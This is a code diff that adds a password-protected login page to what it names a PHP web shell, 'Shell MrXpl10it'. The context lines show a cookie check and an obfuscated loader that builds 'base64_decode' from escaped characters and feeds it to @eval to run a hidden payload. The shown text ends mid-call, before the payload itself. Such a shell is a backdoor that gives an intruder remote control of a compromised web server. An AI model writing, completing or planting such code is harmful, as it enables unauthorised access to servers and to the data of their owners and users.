@@ -29,6 +29,39 @@ header("X-LiteSpeed-Purge: *");
 // Jika pengguna belum login, tampilkan form login
 if (!isset($_COOKIE['loggedin'])) {
     ?>
+    <!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link href="https://fonts.googleapis.com/css2?family=Patrick+Hand&family=Playwrite+AR:wght@100..400&display=swap" rel="stylesheet">
+        <title>Shell MrXpl10it- Masuk</title>
+        <style>
+            body { font-family: "Patrick Hand", cursive; font-weight: 400; font-style: normal; }
+            .container { max-width: 300px; margin: 100px auto; padding: 20px; border: 1px solid #ccc; border-radius: 10px; }
+            .container input { width: 100%; padding: 10px; margin: 10px 0; }
+            .container button { width: 100%; padding: 10px; background-color: gold; border: none; border-radius: 5px; cursor: pointer; }
+            .container button:hover { background-color: darkgoldenrod; }
+            .error { color: red; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <h2>Masuk Mas MrXp10it</h2>
+            <?php if (isset($error)) { echo '<p class="error">'.$error.'</p>'; } ?>
+            <form method="post" action="">
+                <input type="password" name="password" placeholder="Masukkan password Anda..." required>
+                <button type="submit">Masuk</button>
+            </form>
+        </div>
+    </body>
+    </html>
+    <?php
+    exit; // Hentikan eksekusi lebih lanjut jika pengguna belum login
+}
+?>
 <?php 
 
 $bruxcpft="\142\x61\163\145\x36\x34\137\144\x65\143\157\144\145";@eval($bruxcpft(
